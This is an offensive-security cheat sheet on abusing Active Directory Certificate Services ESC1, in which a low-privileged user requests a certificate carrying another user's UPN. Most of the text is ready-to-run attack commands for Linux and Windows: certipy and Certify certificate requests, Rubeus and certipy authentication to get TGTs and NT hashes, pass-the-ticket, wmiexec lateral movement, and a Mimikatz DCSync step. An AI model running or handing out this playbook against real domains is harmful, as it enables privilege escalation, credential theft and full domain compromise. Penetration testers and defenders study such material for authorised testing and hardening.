# ESC1—Alternate Subject (SAN) on Client-Auth Template

## Theory

> [!summary] Overview
> If a certificate template allows requesters to supply the subject and specify a *subjectAltName* (SAN), and low-privileged users can enroll, an attacker can request a certificate for any user (e.g., a privileged account) by placing that user’s UPN in the SAN. The issued certificate can then be used for authentication (PKINIT) to obtain a TGT and/or the NT hash.

## Requirements (all Must Be true)

- Low-privileged principals have **Enroll** on the template.
- **Requires Manager Approval** is **False**.
- **Authorized Signatures Required** is **0**.
- Template EKUs allow authentication (e.g., **Client Authentication** / `1.3.6.1.5.5.7.3.2` or `1.3.6.1.4.1.311.20.2.2` for Smart Card Logon).
- **Enrollee supplies subject** (`ENROLLEE_SUPPLIES_SUBJECT`) is set.
- CA permits **UserSpecifiedSAN** (enrollees can set SAN).

---

## Linux

### Enumerate

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
```

Look for:

- `Enrollee Supplies Subject : True`
- `Client Authentication : True` (or EKU listing)
- `Requires Manager Approval : False`
- `Authorized Signatures Required : 0`
- Enrollment includes low-priv group (e.g., Domain Users)

### Exploit (Request Cert with Alternate SAN)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -upn '<ALT_UPN>'
# Output: saves '<alt>.pfx' (set your own filename as needed)
```

### Authenticate (get TGT and NT hash)

```bash
certipy auth -pfx <PFX_FILE> -username '<ALT_SAM>' -domain '<DOMAIN>' -dc-ip <DC_IP>
# Outputs <ALT_SAM>.ccache and attempts to retrieve NT hash
```

### Use TGT (Kerberos Auth to target)

```bash
KRB5CCNAME=<ALT_SAM>.ccache wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
# or psexec.py / smbexec.py with -k -no-pass
```

Note: Ensure `<TARGET_HOST_FQDN>` resolves (DNS or `/etc/hosts`).

---

## Windows

### Enumerate (Certify)

```powershell
.\Certify.exe find /vulnerable
# Check CA: 'UserSpecifiedSAN' and templates with ENROLLEE_SUPPLIES_SUBJECT, client auth EKU, no manager approval, 0 signatures, enrollable by low-priv.
```

### Enumerate (LDAP Filter for ESC1-like templates)

```powershell
Get-ADObject -LDAPFilter `
'(&(objectclass=pkicertificatetemplate)
  (!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))
  (|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))
  (|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)
    (pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)
    (pkiextendedkeyusage=1.3.6.1.5.2.3.4))
  (mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' `
-SearchBase "CN=Configuration,<FOREST_DN>"
```

### Exploit (Request Cert with Alternate SAN)

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:<ALT_UPN> > cert.pem
```

### Convert to PFX (Windows OpenSSL or Linux)

```powershell
# Windows (path may vary) — set/leave export password as desired
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 `
  -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
  -export -out cert.pfx
```

### Authenticate and Extract Creds (Rubeus)

```powershell
.\Rubeus.exe asktgt /user:<ALT_SAM> /certificate:cert.pfx /getcredentials /nowrap
# Returns base64 TGT (kirbi) and NTLM if available
```

### Use Ticket (Pass-the-Ticket)

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
# In the shown PowerShell session:
.\Rubeus.exe ptt /ticket:<BASE64_TGT_HERE>
```

### Example Post-exploitation

```powershell
# With TGT loaded, perform privileged actions, e.g., DCSync:
# (Use your preferred tooling/workflow)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\<ALT_SAM>"'
```

**Notes**

- `<CA_NAME>` for `certipy req` is the CA common name (as shown by `certipy find`). For `Certify.exe request`, use `<CA_FQDN>\<CA_NAME>`.
- Ensure time sync and domain resolution.
